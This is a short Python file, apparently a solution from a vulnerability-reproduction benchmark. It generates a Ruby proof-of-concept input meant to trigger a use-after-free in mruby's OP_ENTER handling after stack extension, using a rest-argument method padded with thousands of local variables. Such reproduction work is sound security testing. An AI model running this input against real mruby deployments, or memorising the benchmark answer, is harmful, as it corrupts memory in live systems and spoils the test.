import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a Ruby script designed to trigger a stack extension in mruby
        # during OP_ENTER by combining a rest-argument method with a very large
        # number of local variables. This aims to exercise the bug where a
        # pointer derived from the stack isn't updated after mrb_stack_extend().
        #
        # The method g(*r) ensures OP_ENTER processes rest arguments (uses argv).
        # A large number of locals forces mrb_stack_extend to reallocate the VM
        # stack. If the vulnerable version fails to adjust pointers, subsequent
        # argv use can touch freed memory (UAF).
        #
        # We use a compact chain-assignment to declare many locals but keep the
        # script relatively small.
        N_LOCALS = 4096  # Large enough to force stack extension across versions

        # Build chain assignment: v0=v1=...=v4095=nil
        locals_chain = "=".join(f"v{i}" for i in range(N_LOCALS)) + "=nil"

        # Pass multiple arguments to ensure OP_ENTER creates a non-empty rest array
        args = ",".join(str(i) for i in range(1, 129))  # 128 args

        script = []
        script.append("def g(*r)")
        script.append(locals_chain)
        script.append("end")
        # Invoke the method multiple times to increase likelihood and stability
        script.append(f"g({args})")
        script.append(f"g({args})")
        script.append(f"g({args})")
        s = "\n".join(script) + "\n"
        return s.encode("utf-8")
